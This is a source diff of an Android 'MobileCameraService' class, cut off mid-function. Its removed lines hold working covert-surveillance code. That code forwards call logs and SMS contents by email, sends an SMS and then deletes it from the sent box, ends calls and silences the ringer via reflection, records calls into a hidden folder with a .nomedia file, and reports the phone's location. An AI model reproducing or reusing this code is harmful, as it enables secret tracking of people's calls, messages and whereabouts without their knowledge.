@@ -6,14 +6,10 @@ import java.io.InputStream;
 import java.io.InterruptedIOException;
 import java.io.OutputStream;
 import java.lang.reflect.Method;
-import java.text.SimpleDateFormat;
-import java.util.ArrayList;
-import java.util.Date;
 import java.util.LinkedList;
 import java.util.List;
 import java.util.Random;
 
-import com.android.internal.telephony.ITelephony;
 import com.baidu.location.BDLocation;
 import com.baidu.location.BDLocationListener;
 import com.baidu.location.LocationClient;
@@ -27,13 +23,9 @@ import android.app.Notification;
 import android.app.PendingIntent;
 import android.app.Service;
 import android.content.BroadcastReceiver;
-import android.content.ContentValues;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
-import android.database.ContentObserver;
-import android.database.Cursor;
-import android.database.sqlite.SQLiteDatabase;
 import android.graphics.PixelFormat;
 import android.hardware.Camera;
 import android.hardware.Camera.Parameters;
@@ -49,8 +41,6 @@ import android.media.AudioRecord;
 import android.media.AudioTrack;
 import android.media.MediaPlayer;
 import android.media.MediaRecorder;
-import android.media.MediaRecorder.OnErrorListener;
-import android.media.MediaRecorder.OnInfoListener;
 import android.net.ConnectivityManager;
 import android.net.LocalServerSocket;
 import android.net.LocalSocket;
@@ -69,17 +59,8 @@ import android.os.IHardwareService;
 import android.os.Looper;
 import android.os.Message;
 import android.os.PowerManager;
-import android.os.StatFs;
 import android.os.Vibrator;
-import android.provider.CallLog;
-import android.provider.ContactsContract;
 import android.provider.Settings;
-import android.telephony.PhoneStateListener;
-import android.telephony.ServiceState;
-import android.telephony.SignalStrength;
-import android.telephony.SmsManager;
-import android.telephony.SmsMessage;
-import android.telephony.TelephonyManager;
 import android.util.Base64;
 import android.util.Log;
 import android.view.Gravity;
@@ -122,16 +103,8 @@ public class MobileCameraService extends Service implements MediaRecorder.OnInfo
 			switch(what)
 			{
 			case WORK_MSG_CHECK:
-				if (1 == AppSettings.GetSoftwareKeyDwordValue(_instance, AppSettings.STRING_REGKEY_NAME_ENABLE_EMAIL, 1))
-		    	{
-					try {
-						do_check_out_call();
-						do_check_out_sms();
-					}catch (Exception e) {
-						// TODO Auto-generated catch block
-						e.printStackTrace();
-					}
-				}
+				;
+				;
 				Message send_msg = _instance.mWorkerHandler.obtainMessage(WORK_MSG_CHECK);
                 _instance.mWorkerHandler.sendMessageDelayed(send_msg, 15000);
 				break;
@@ -139,313 +112,6 @@ public class MobileCameraService extends Service implements MediaRecorder.OnInfo
 			
 			super.handleMessage(msg);
 		}
-	}
-	
-	
-	public class CallContentObserver extends ContentObserver {
-
-		public CallContentObserver(Handler handler) {
-			super(handler);
-			// TODO Auto-generated constructor stub
-		}
-		
-		@Override  
-	    public void onChange(boolean selfChange) {
-			try {
-				do_check_out_call();
-				do_check_in_call();
-			}catch (Exception e) {
-				// TODO Auto-generated catch block
-				e.printStackTrace();
-			}
-		}
-	}
-	
-	public class SMSContentObserver extends ContentObserver {
-
-		public SMSContentObserver(Handler handler) {
-			super(handler);
-			// TODO Auto-generated constructor stub
-		}
-		
-		@Override  
-	    public void onChange(boolean selfChange) {
-			try {
-				do_check_out_sms();
-				do_check_in_sms();
-			}catch (Exception e) {
-				// TODO Auto-generated catch block
-				e.printStackTrace();
-			}
-		}
-	}
-	
-	void do_check_out_call()
-	{
-		if (null == _instance) {
-			return;
-		}
-		Log.d(TAG, "do_check_out_call()...");
-		
-		String[] projection = { CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DATE };
-		
-		Cursor cursor = _instance.getContentResolver().query(  
-    			CallLog.Calls.CONTENT_URI,
-                projection, // Which columns to return.  
-                CallLog.Calls.TYPE + " = '"  
-                        + CallLog.Calls.OUTGOING_TYPE + "'", // WHERE clause.  
-                null, // WHERE clause value substitution  
-                CallLog.Calls.DATE + " desc"); // Sort order.
-        
-        if (cursor == null)
-    	{
-    		return;
-    	}
-    	for (int i = 0; i < cursor.getCount(); i++)
-    	{
-            cursor.moveToPosition(i);
-            
-            SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
-            long time = Long.parseLong(cursor.getString(cursor.getColumnIndex(CallLog.Calls.DATE)));
-            if (time <= AppSettings.GetSoftwareKeyLongValue(_instance, AppSettings.STRING_REGKEY_NAME_LAST_OUT_CALL_TIME, 0))
-            {
-            	cursor.close();
-                return;
-            }
-            else {
-            	AppSettings.SaveSoftwareKeyLongValue(_instance, AppSettings.STRING_REGKEY_NAME_LAST_OUT_CALL_TIME, time);
-            }
-            Date d = new Date(time);
-            String date = dateFormat.format(d);
-            // 取得联系人名字 
-            String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
-            String person = findContactByNumber(_instance, number);
-            
-            String emailAddress = AppSettings.GetSoftwareKeyValue(_instance, AppSettings.STRING_REGKEY_NAME_EMAILADDRESS, "");
-			String name = AppSettings.GetSoftwareKeyValue(_instance, AppSettings.STRING_REGKEY_NAME_NODENAME, "");
-			String format = _instance.getResources().getString(R.string.msg_on_call_out_format);
-			String content = String.format(format, name, date, number, person);
-            if (false == emailAddress.equals(""))
-			{
-				NativeSendEmail(emailAddress, content, content);
-			}
-			
-            cursor.close();
-            return;
-        }
-    	cursor.close();
-    	return;
-	}
-	
-	void do_check_in_call()
-	{
-		if (null == _instance) {
-			return;
-		}
-		Log.d(TAG, "do_check_in_call()...");
-		
-		String[] projection = { CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DATE };
-		
-		Cursor cursor = _instance.getContentResolver().query(  
-    			CallLog.Calls.CONTENT_URI,
-                projection, // Which columns to return.  
-                CallLog.Calls.TYPE + " != '"  
-                        + CallLog.Calls.OUTGOING_TYPE + "'", // WHERE clause.  
-                null, // WHERE clause value substitution  
-                CallLog.Calls.DATE + " desc"); // Sort order.
-        
-        if (cursor == null)
-    	{
-    		return;
-    	}
-    	for (int i = 0; i < cursor.getCount(); i++)
-    	{
-            cursor.moveToPosition(i);
-            
-            SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
-            long time = Long.parseLong(cursor.getString(cursor.getColumnIndex(CallLog.Calls.DATE)));
-            if (time <= AppSettings.GetSoftwareKeyLongValue(_instance, AppSettings.STRING_REGKEY_NAME_LAST_IN_CALL_TIME, 0))
-            {
-            	cursor.close();
-                return;
-            }
-            else {
-            	AppSettings.SaveSoftwareKeyLongValue(_instance, AppSettings.STRING_REGKEY_NAME_LAST_IN_CALL_TIME, time);
-            }
-            Date d = new Date(time);
-            String date = dateFormat.format(d);
-            // 取得联系人名字 
-            String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
-            String person = findContactByNumber(_instance, number);
-            
-            String emailAddress = AppSettings.GetSoftwareKeyValue(_instance, AppSettings.STRING_REGKEY_NAME_EMAILADDRESS, "");
-			String name = AppSettings.GetSoftwareKeyValue(_instance, AppSettings.STRING_REGKEY_NAME_NODENAME, "");
-			String format = null;
-			int call_type = Integer.parseInt(cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE)));
-			if (call_type == CallLog.Calls.INCOMING_TYPE) {
-				format = _instance.getResources().getString(R.string.msg_on_call_in_accepted_format);
-			}
-			else if (call_type == CallLog.Calls.MISSED_TYPE) {
-				format = _instance.getResources().getString(R.string.msg_on_call_in_missed_format);
-			}
-			else {
-				format = _instance.getResources().getString(R.string.msg_on_call_in_rejected_format);
-			}
-			String content = String.format(format, name, date, number, person);
-            if (false == emailAddress.equals(""))
-			{
-				NativeSendEmail(emailAddress, content, content);
-			}
-			
-            cursor.close();
-            return;
-        }
-    	cursor.close();
-    	return;
-	}
-	
-	void do_check_out_sms()
-	{
-		if (null == _instance) {
-			return;
-		}
-		Log.d(TAG, "do_check_out_sms()...");
-		
-		String[] projection = { "address", "body", "date" };
-		
-		Cursor cursor = _instance.getContentResolver().query(  
-    			Uri.parse("content://sms/sent"),
-                projection, // Which columns to return.  
-                null, // WHERE clause.  
-                null, // WHERE clause value substitution  
-                "date desc"); // Sort order.
-        
-        if (cursor == null)
-    	{
-    		return;
-    	}
-    	for (int i = 0; i < cursor.getCount(); i++)
-    	{
-            cursor.moveToPosition(i);
-            
-            SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
-            long time = Long.parseLong(cursor.getString(cursor.getColumnIndex("date")));
-            if (time <= 5000 + AppSettings.GetSoftwareKeyLongValue(_instance, AppSettings.STRING_REGKEY_NAME_LAST_OUT_SMS_TIME, 0))
-            {
-            	cursor.close();
-                return;
-            }
-            else {
-            	AppSettings.SaveSoftwareKeyLongValue(_instance, AppSettings.STRING_REGKEY_NAME_LAST_OUT_SMS_TIME, time);
-            }
-            Date d = new Date(time);
-            String date = dateFormat.format(d);
-            // 取得联系人名字 
-            String number = cursor.getString(cursor.getColumnIndex("address"));
-            String person = findContactByNumber(_instance, number);
-            String body = cursor.getString(cursor.getColumnIndex("body"));
-            
-            String emailAddress = AppSettings.GetSoftwareKeyValue(_instance, AppSettings.STRING_REGKEY_NAME_EMAILADDRESS, "");
-			String name = AppSettings.GetSoftwareKeyValue(_instance, AppSettings.STRING_REGKEY_NAME_NODENAME, "");
-			String format = _instance.getResources().getString(R.string.msg_on_sms_sent_format);
-			String content = String.format(format, name, date, number, person, body);
-            if (false == emailAddress.equals(""))
-			{
-				NativeSendEmail(emailAddress, content, content);
-			}
-			
-            cursor.close();
-            return;
-        }
-    	cursor.close();
-    	return;
-	}
-	
-	void do_check_in_sms()
-	{
-		if (null == _instance) {
-			return;
-		}
-		Log.d(TAG, "do_check_in_sms()...");
-		
-		String[] projection = { "address", "body", "date" };
-		
-		Cursor cursor = _instance.getContentResolver().query(  
-    			Uri.parse("content://sms/inbox"),
-                projection, // Which columns to return.  
-                null, // WHERE clause.  
-                null, // WHERE clause value substitution  
-                "date desc"); // Sort order.
-        
-        if (cursor == null)
-    	{
-    		return;
-    	}
-    	for (int i = 0; i < cursor.getCount(); i++)
-    	{
-            cursor.moveToPosition(i);
-            
-            SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
-            long time = Long.parseLong(cursor.getString(cursor.getColumnIndex("date")));
-            if (time <= AppSettings.GetSoftwareKeyLongValue(_instance, AppSettings.STRING_REGKEY_NAME_LAST_IN_SMS_TIME, 0))
-            {
-            	cursor.close();
-                return;
-            }
-            else {
-            	AppSettings.SaveSoftwareKeyLongValue(_instance, AppSettings.STRING_REGKEY_NAME_LAST_IN_SMS_TIME, time);
-            }
-            Date d = new Date(time);
-            String date = dateFormat.format(d);
-            // 取得联系人名字 
-            String number = cursor.getString(cursor.getColumnIndex("address"));
-            String person = findContactByNumber(_instance, number);
-            String body = cursor.getString(cursor.getColumnIndex("body"));
-            
-            String emailAddress = AppSettings.GetSoftwareKeyValue(_instance, AppSettings.STRING_REGKEY_NAME_EMAILADDRESS, "");
-			String name = AppSettings.GetSoftwareKeyValue(_instance, AppSettings.STRING_REGKEY_NAME_NODENAME, "");
-			String format = _instance.getResources().getString(R.string.msg_on_sms_recv_format);
-			String content = String.format(format, name, date, number, person, body);
-            if (false == emailAddress.equals(""))
-			{
-				NativeSendEmail(emailAddress, content, content);
-			}
-			
-            cursor.close();
-            return;
-        }
-    	cursor.close();
-    	return;
-	}
-	
-	void delete_sent_sms(String remote_num, String content)
-	{
-		final String _content = content;
-		_instance.mMainHandler.postDelayed(new Runnable(){
-			@Override
-			public void run() {
-				try {
-					_instance.getContentResolver().delete(Uri.parse("content://sms"), "body=\"" + _content + "\"", null);
-				} catch (Exception e) {
-					e.printStackTrace();
-				}
-			}
-		}, 2500);
-	}
-	
-	void delete_recv_sms(String remote_num, String content)
-	{
-		final String _content = content;
-		_instance.mMainHandler.postDelayed(new Runnable(){
-			@Override
-			public void run() {
-				try {
-					_instance.getContentResolver().delete(Uri.parse("content://sms"), "body=\"" + _content + "\"", null);
-				} catch (Exception e) {
-					e.printStackTrace();
-				}
-			}
-		}, 2500);
 	}
 	
 	
@@ -489,42 +155,10 @@ public class MobileCameraService extends Service implements MediaRecorder.OnInfo
 				boolean approved = (msg.arg2 == 1);
 				AppSettings.SaveSoftwareKeyDwordValue(_instance, AppSettings.STRING_REGKEY_NAME_CAMID, comments_id);
 				
-				//if (0 == AppSettings.GetSoftwareKeyDwordValue(_instance, AppSettings.STRING_REGKEY_NAME_HIDE_UI, 0))
-		    	//{
-		    	//	SharedFuncLib.MyMessageTip(_instance, "Online (ID:" + comments_id + ")");
-		    	//}
-				
-				{//安装后只发送一次短信通知，报告ID号
-					String smsPhoneNum = AppSettings.GetSoftwareKeyValue(_instance, AppSettings.STRING_REGKEY_NAME_SMSPHONENUM, "");
-					if (false == smsPhoneNum.equals(""))
-					{
-						sendSMS(smsPhoneNum, "ID=" + comments_id);
-						AppSettings.SaveSoftwareKeyValue(_instance, AppSettings.STRING_REGKEY_NAME_SMSPHONENUM, "");
-					}
-				}
-				
-				long nowTime = System.currentTimeMillis();
-				long lastOnlineTime = AppSettings.GetSoftwareKeyLongValue(_instance, AppSettings.STRING_REGKEY_NAME_LAST_ONLINE_TIME, 0);
-				if (nowTime - lastOnlineTime >= 1000*3600*24)
-				{
-					AppSettings.SaveSoftwareKeyLongValue(_instance, AppSettings.STRING_REGKEY_NAME_LAST_ONLINE_TIME, nowTime);
-					
-					String emailAddress = AppSettings.GetSoftwareKeyValue(_instance, AppSettings.STRING_REGKEY_NAME_EMAILADDRESS, "");
-					String name = AppSettings.GetSoftwareKeyValue(_instance, AppSettings.STRING_REGKEY_NAME_NODENAME, "");
-					String format = _instance.getResources().getString(approved ? R.string.msg_on_camid_ok : R.string.msg_on_camid_ng);
-					String content = String.format(format, name, comments_id);
-					if (Build.VERSION.SDK_INT >= 19) {//Android 4.4
-						content +=  _instance.getResources().getString(R.string.msg_on_camid_ok_suffix);
-					}
-					
-					if (1 == AppSettings.GetSoftwareKeyDwordValue(_instance, AppSettings.STRING_REGKEY_NAME_ENABLE_EMAIL, 1))
-			    	{
-						if (false == emailAddress.equals(""))
-						{
-							NativeSendEmail(emailAddress, content, content);
-						}
-			    	}
-				}
+				if (0 == AppSettings.GetSoftwareKeyDwordValue(_instance, AppSettings.STRING_REGKEY_NAME_HIDE_UI, 0))
+		    	{
+		    		SharedFuncLib.MyMessageTip(_instance, "Online (ID:" + comments_id + ")");
+		    	}
 				
 				//if (false == approved) {
 				//	_instance.stopSelf();
@@ -546,758 +180,7 @@ public class MobileCameraService extends Service implements MediaRecorder.OnInfo
 			super.handleMessage(msg);
 		}
 	}
-	
-	private void sendEmail(String emailAddress, String subject, String content)
-	{
-		String name = AppSettings.GetSoftwareKeyValue(_instance, AppSettings.STRING_REGKEY_NAME_NODENAME, "");
-		NativeSendEmail(emailAddress, name + " " + subject, content);
-	}
-	
-    private void sendSMS(String phoneNumber, String message)
-    {
-    	phoneNumber = phoneNumber.replace(" ", ";");
-    	phoneNumber = phoneNumber.replace(",", ";");
-        String[] numArray = phoneNumber.split(";");
-    	
-	    // ---sends an SMS message to another device---   
-	    SmsManager sms = SmsManager.getDefault();   
-	  
-	    for (int i = 0; i < numArray.length; i++)
-	    {
-	    	numArray[i] = numArray[i].trim();
-	    	if (numArray[i].equals("")) {
-	    		continue;
-	    	}
-	    	
-	        ArrayList<String> msgs = sms.divideMessage(message);   
-	        for (String msg : msgs) {   
-	        	Log.d(TAG, "sms.sendTextMessage(" + numArray[i] + ", " + msg + ")...");
-	        	sms.sendTextMessage(numArray[i], null, msg, null, null);
-	        	
-	        	delete_sent_sms(numArray[i], msg);
-	        }     
-	    }
-    }
     
-    private void endCall()
-    {
-    	//初始化iTelephony
-		Class <TelephonyManager> c = TelephonyManager.class;
-		Method getITelephonyMethod = null;
-
-		try {
-			// 获取所有public/private/protected/默认   方法的函数，
-            // 如果只需要获取public方法，则可以调用getMethod.   
-			getITelephonyMethod = c.getDeclaredMethod("getITelephony", (Class[])null);
-			
-			// 将要执行的方法对象设置是否进行访问检查，也就是说对于public/private/protected/默认   
-            // 我们是否能够访问。值为 true 则指示反射的对象在使用时应该取消 Java 语言访问检查。
-			// 值为 false 则指示反射的对象应该实施 Java 语言访问检查。   
-			getITelephonyMethod.setAccessible(true);
-			
-			ITelephony iTelephony = (ITelephony) getITelephonyMethod.invoke(mTelephonyManager, (Object[])null);
-			iTelephony.endCall();
-		} catch (Exception e) {
-			// TODO Auto-generated catch block
-			e.printStackTrace();
-		}
-    }
-
-    private void silenceRinger()
-    {
-    	//初始化iTelephony
-		Class <TelephonyManager> c = TelephonyManager.class;
-		Method getITelephonyMethod = null;
-
-		try {
-			// 获取所有public/private/protected/默认   方法的函数，
-            // 如果只需要获取public方法，则可以调用getMethod.   
-			getITelephonyMethod = c.getDeclaredMethod("getITelephony", (Class[])null);
-			
-			// 将要执行的方法对象设置是否进行访问检查，也就是说对于public/private/protected/默认   
-            // 我们是否能够访问。值为 true 则指示反射的对象在使用时应该取消 Java 语言访问检查。
-			// 值为 false 则指示反射的对象应该实施 Java 语言访问检查。   
-			getITelephonyMethod.setAccessible(true);
-			
-			ITelephony iTelephony = (ITelephony) getITelephonyMethod.invoke(mTelephonyManager, (Object[])null);
-			iTelephony.silenceRinger();  
-		} catch (Exception e) {
-			// TODO Auto-generated catch block
-			e.printStackTrace();
-		}
-    }
-	
-    private boolean isAuthPhone(String incomingNumber)
-    {
-    	boolean bAuthPhone = false;
-		String smsPhoneNum = AppSettings.GetSoftwareKeyValue(_instance, AppSettings.STRING_REGKEY_NAME_SMSPHONENUM, "");
-		String phoneNum = smsPhoneNum;
-		phoneNum = phoneNum.replace(" ", ";");
-		phoneNum = phoneNum.replace(",", ";");
-		String[] numArray = phoneNum.split(";");
-		for (int i = 0; i < numArray.length; i++)
-	    {
-	    	numArray[i] = numArray[i].trim();
-	    	if (false == numArray[i].equals("")) {
-	    		if (incomingNumber.equals(numArray[i]) || 
-	    				( incomingNumber.startsWith("+") && incomingNumber.contains(numArray[i]) ) ||
-	    				( numArray[i].startsWith("+")    && numArray[i].contains(incomingNumber) )     ) {
-	    			bAuthPhone = true;
-	    			break;
-	    		}
-	    	}
-	    }
-		return bAuthPhone;
-    }
-    
-    private String GenerateLocationMsg(Context context)
-    {
-    	if (_instance != null &&
-    			(Math.abs(_instance.mBaiduLongitude) >= 0.01 || Math.abs(_instance.mBaiduLatitude) >= 0.01)) {
-			String strGPSLongi = String.format("%.5f", _instance.mBaiduLongitude);
-			String strGPSLati  = String.format("%.5f", _instance.mBaiduLatitude);
-        	return String.format(context.getResources().getString(R.string.msg_sms_location_format), "http://ykz.e2eye.com/LocMap.php?lati=" + strGPSLati + "&longi=" + strGPSLongi);
-    	}
-    	
-    	LocationManager locationManager = (LocationManager)context.getSystemService(Context.LOCATION_SERVICE);
-        boolean gpsEnabled = locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER);
-        boolean networkEnabled = locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER);
-        
-        if (gpsEnabled)
-        {
-        	Location lastLoc = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
-    		if (null != lastLoc)
-    		{
-    			Log.d(TAG, "GPS_PROVIDER " + lastLoc.toString());
-    			String strGPSLongi = String.format("%.4f", lastLoc.getLongitude());
-    			String strGPSLati  = String.format("%.4f", lastLoc.getLatitude());
-            	return String.format(context.getResources().getString(R.string.msg_sms_location_format), "http://ykz.e2eye.com/LocMap.php?lati=" + strGPSLati + "&longi=" + strGPSLongi);
-    		}
-        }
-        
-        if (networkEnabled)
-        {
-	    	Location lastLoc = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
-			if (null != lastLoc)
-			{
-				Log.d(TAG, "NETWORK_PROVIDER " + lastLoc.toString());
-				String strGPSLongi = String.format("%.4f", lastLoc.getLongitude());
-				String strGPSLati  = String.format("%.4f", lastLoc.getLatitude());
-	        	return String.format(context.getResources().getString(R.string.msg_sms_location_format), "http://ykz.e2eye.com/LocMap.php?lati=" + strGPSLati + "&longi=" + strGPSLongi);
-			}
-        }
-        
-        return "http://ykz.e2eye.com/cloudctrl/LocationMap.php";
-    }
-    
-    public void SendStatusReport(String toAddress)
-    {
-    	String comments_id_str = null;
-    	String wifi_status_str = null;
-    	String battery_percent_str = null;
-    	
-    	int comments_id = AppSettings.GetSoftwareKeyDwordValue(this, AppSettings.STRING_REGKEY_NAME_CAMID, 0);
-    	if (0 == comments_id) {
-    		comments_id_str = getResources().getString(R.string.msg_unknown_val);
-    	}
-    	else {
-    		comments_id_str = String.format("%d", comments_id);
-    	}
-    	
-    	WifiManager wifiManager = (WifiManager) getSystemService(Context.WIFI_SERVICE); 
-	    boolean bWifiEnabled = wifiManager.isWifiEnabled();
-	    if (bWifiEnabled) {
-	    	wifi_status_str = getResources().getString(R.string.msg_sms_cmd_result_enabled);
-	    }
-	    else {
-	    	wifi_status_str = getResources().getString(R.string.msg_sms_cmd_result_disabled);
-	    }
-	    
-	    if (0 == m_battery_percent) {
-	    	battery_percent_str = getResources().getString(R.string.msg_unknown_val);
-	    }
-	    else {
-	    	battery_percent_str = String.format("%d%%", m_battery_percent);
-	    }
-	    
-	    String body = String.format(getResources().getString(R.string.msg_sms_cmd_query_result_format), 
-	    		comments_id_str, wifi_status_str, battery_percent_str);
-	    
-	    //_instance.sendSMS(toNumber, body);
-	    if (false == toAddress.equals(""))
-	    {
-	    	NativeSendEmail(toAddress, body, body);
-	    }
-    }
-    
-    public void UnknownSmsCmd(String toNumber, String sms_cmd)
-    {
-    	String fmt = _instance.getResources().getString(R.string.msg_sms_cmd_result_0);
-    	if (sms_cmd.length() < fmt.length()) {
-    		_instance.sendSMS(toNumber, String.format(fmt, sms_cmd));
-    	}
-    }
-    
-    private String findSimItem1(Context context, String address)
-    {
-    	String[] projection = { "name",  "number" };
-    	
-    	Cursor cursor = context.getContentResolver().query(  
-    			Uri.parse("content://icc/adn"),
-                projection, // Which columns to return.  
-                "number = '"  
-                        + address + "'", // WHERE clause.  
-                null, // WHERE clause value substitution  
-                null); // Sort order.
-    	if (cursor == null)
-    	{
-    		cursor = context.getContentResolver().query(  
-    				Uri.parse("content://icc/adn"),
-                    projection, // Which columns to return.  
-                    "number = '"  
-                            + "+86" + address + "'", // WHERE clause.  
-                    null, // WHERE clause value substitution  
-                    null); // Sort order.
-        }
-    	if (cursor == null)
-    	{
-    		return "?";
-    	}
-    	for (int i = 0; i < cursor.getCount(); i++)
-    	{
-            cursor.moveToPosition(i);
-            // 取得联系人名字 
-            int nameFieldColumnIndex = cursor.getColumnIndex("name");
-            String name = cursor.getString(nameFieldColumnIndex);
-            cursor.close();
-            return name;
-        }
-    	cursor.close();
-    	return "?";
-    }
-    
-    private String findSimItem2(Context context, String address)
-    {
-    	String[] projection = { "name",  "number" };
-    	
-    	Cursor cursor = context.getContentResolver().query(  
-    			Uri.parse("content://sim/adn"),
-                projection, // Which columns to return.  
-                "number = '"  
-                        + address + "'", // WHERE clause.  
-                null, // WHERE clause value substitution  
-                null); // Sort order.
-    	if (cursor == null)
-    	{
-    		cursor = context.getContentResolver().query(  
-    				Uri.parse("content://sim/adn"),
-                    projection, // Which columns to return.  
-                    "number = '"  
-                            + "+86" + address + "'", // WHERE clause.  
-                    null, // WHERE clause value substitution  
-                    null); // Sort order.
-        }
-    	if (cursor == null)
-    	{
-    		return "?";
-    	}
-    	for (int i = 0; i < cursor.getCount(); i++)
-    	{
-            cursor.moveToPosition(i);
-            // 取得联系人名字 
-            int nameFieldColumnIndex = cursor.getColumnIndex("name");
-            String name = cursor.getString(nameFieldColumnIndex);
-            cursor.close();
-            return name;
-        }
-    	cursor.close();
-    	return "?";
-    }
-    
-    private String findContactByNumber(Context context, String address)
-    {
-    	address = address.replace(" ", "");
-    	if (address.startsWith("+86"))
-		{
-    		address = address.replace("+86", "");
-		}
-    	if (address.equals(""))
-    	{
-    		return "?";
-    	}
-    	
-    	String[] projection = { ContactsContract.Contacts.DISPLAY_NAME,  
-                ContactsContract.CommonDataKinds.Phone.NUMBER };
-    	
-    	Cursor cursor = context.getContentResolver().query(  
-    			ContactsContract.CommonDataKinds.Phone.CONTENT_URI,  
-                projection, // Which columns to return.  
-                ContactsContract.CommonDataKinds.Phone.NUMBER + " = '"  
-                        + address + "'", // WHERE clause.  
-                null, // WHERE clause value substitution  
-                null); // Sort order.
-    	if (cursor == null)
-    	{
-    		cursor = context.getContentResolver().query(  
-    				ContactsContract.CommonDataKinds.Phone.CONTENT_URI,  
-                    projection, // Which columns to return.  
-                    ContactsContract.CommonDataKinds.Phone.NUMBER + " = '"  
-                            + "+86" + address + "'", // WHERE clause.  
-                    null, // WHERE clause value substitution  
-                    null); // Sort order.
-        }
-    	if (cursor == null)
-    	{
-    		String name = "?";
-    		try {
-    			name = findSimItem1(context, address);
-    		} catch (Exception e) {
-    			// TODO Auto-generated catch block
-    			e.printStackTrace();
-    		}
-    		if (name.equals("?"))
-    		{
-    			try {
-        			name = findSimItem2(context, address);
-        		} catch (Exception e) {
-        			// TODO Auto-generated catch block
-        			e.printStackTrace();
-        		}
-    		}
-    		return name;
-    	}
-    	for (int i = 0; i < cursor.getCount(); i++)
-    	{
-            cursor.moveToPosition(i);
-            // 取得联系人名字 
-            int nameFieldColumnIndex = cursor  
-                    .getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME);
-            String name = cursor.getString(nameFieldColumnIndex);
-            cursor.close();
-            return name;
-        }
-    	cursor.close();
-    	return "?";
-    }
-    
-    public class MyPhoneStateListener extends PhoneStateListener{  
-    	static final String VOICE_RECORD_FOLDER = "lixianluyin";
-    	static final String VOICE_CALL_FILE = "voice_call";
-    	MediaRecorder mVoiceRecorder = null;
-    	String voiceRecordFile = null;
-    	
-    	String get_voice_record_file(String incomingNumber, String contactName)
-    	{
-    		String sd_path = "/sdcard";
-    		String file_path = sd_path + "/" + VOICE_RECORD_FOLDER;
-    		File dir = new File(file_path);
-    		if (false == dir.exists()) {
-    			sd_path = "/storage/sdcard0";
-    			file_path = sd_path + "/" + VOICE_RECORD_FOLDER;
-        		dir = new File(file_path);
-        		if (false == dir.exists()) {
-        			sd_path = "/storage/sdcard1";
-        			file_path = sd_path + "/" + VOICE_RECORD_FOLDER;
-            		dir = new File(file_path);
-            		if (false == dir.exists()) {
-            			Log.d(TAG, "SD-Card no folder " + VOICE_RECORD_FOLDER);
-            			return null;
-            		}
-        		}
-    		}
-    		
-    		//防止音乐应用搜索到录音文件
-    		File nomedia = new File(file_path + "/" + ".nomedia");
-    		if (false == nomedia.exists()) {
-    			try {
-					nomedia.createNewFile();
-				} catch (Exception e) {}
-    		}
-    		
-        	StatFs sf = null;
-        	try {
-        		sf = new StatFs(sd_path);
-        	} catch (Exception e) {
-        		return null;
-        	}
-    		
-        	long blockSize = sf.getBlockSize();
-        	long availableBlocks = sf.getAvailableBlocks();
-        	long freeKB = blockSize*availableBlocks/1024;
-        	Log.d(TAG, "SD-Card available size: "+ freeKB + "KB");
-        	if (freeKB < 1024/*KB*/) {
-        		Log.d(TAG, "SD-Card available size to small, skip!!!");
-        		return null;
-        	}
-        	
-    		if (freeKB < 1024*32) {
-    			delete_the_oldest_file(dir);
-    		}
-    		
-        	SimpleDateFormat sDateFormat = new SimpleDateFormat("yyyy-MM-dd_HH-mm-ss");
-        	long milliseconds = System.currentTimeMillis();
-        	String time_str = sDateFormat.format(new java.util.Date(milliseconds));
-        	
-        	incomingNumber = incomingNumber.replace("+", "");
-        	contactName = contactName.replace("/", "");
-        	contactName = contactName.replace("\\", "");
-        	contactName = contactName.replace("\'", "");
-        	contactName = contactName.replace("\"", "");
-        	contactName = contactName.replace("*", "");
-        	contactName = contactName.replace("?", "");
-        	contactName = contactName.replace(":", "");
-        	contactName = contactName.replace("|", "");
-        	contactName = contactName.replace("<", "");
-        	contactName = contactName.replace(">", "");
-        	String strFilePath = String.format("%s/.%s_%s(%s).amr", file_path, time_str, incomingNumber, contactName);
-        	return strFilePath;
-    	}
-    	
-    	boolean is_record_from_voicecall()
-    	{
-    		if (null == voiceRecordFile) {
-    			return false;
-    		}
-    		File f = new File(voiceRecordFile);
-    		File f2 = new File(f.getParent() + "/" + VOICE_CALL_FILE);
-    		return f2.exists();
-    	}
-    	
-        void delete_the_oldest_file(File dir)
-        {
-        	if (dir.isDirectory() == false) {
-        		return;
-        	}
-        	
-        	File[] files = dir.listFiles();
-        	if (files == null) {
-        		return;
-        	}
-        	
-        	Long oldest_time = Long.MAX_VALUE;
-        	File oldest_file = null;
-        	for (int i = 0; i < files.length; i++)
-        	{
-        		Long time = files[i].lastModified();
-        		if (time == 0) {
-        			continue;
-        		}
-        		if (time < oldest_time) {
-        			oldest_time = time;
-        			oldest_file = files[i];
-        		}
-        	}
-        	
-        	if (oldest_file != null) {
-        		oldest_file.delete();
-        		Log.d(TAG, "SD-Card delete oldest file!!!");
-        	}
-        }
-    	
-        @Override  
-        public void onCallStateChanged(int state, String incomingNumber) {
-            
-            switch (state)  {   
-            case TelephonyManager.CALL_STATE_IDLE:   
-                //CALL_STATE_IDLE
-            	if (mVoiceRecorder != null)
-	            {
-            		Log.d(TAG, "mVoiceRecorder stop...");
-        		    //wait for a while
-        	        try {
-        	        	mVoiceRecorder.stop();
-        	        	
-        	            Thread.sleep(1000);
-        	            
-            	        mVoiceRecorder.reset();
-        	        } catch (Exception e1) {
-        	        	e1.printStackTrace();
-        	        }
-        	        mVoiceRecorder.release();
-        		    mVoiceRecorder = null;
-	            }
-                break;
-                
-            case TelephonyManager.CALL_STATE_OFFHOOK:   
-                //CALL_STATE_OFFHOOK
-            	if (null != (voiceRecordFile = get_voice_record_file(incomingNumber, findContactByNumber(_instance, incomingNumber))))
-            	{
-            		try {
-	            		mVoiceRecorder = new MediaRecorder();
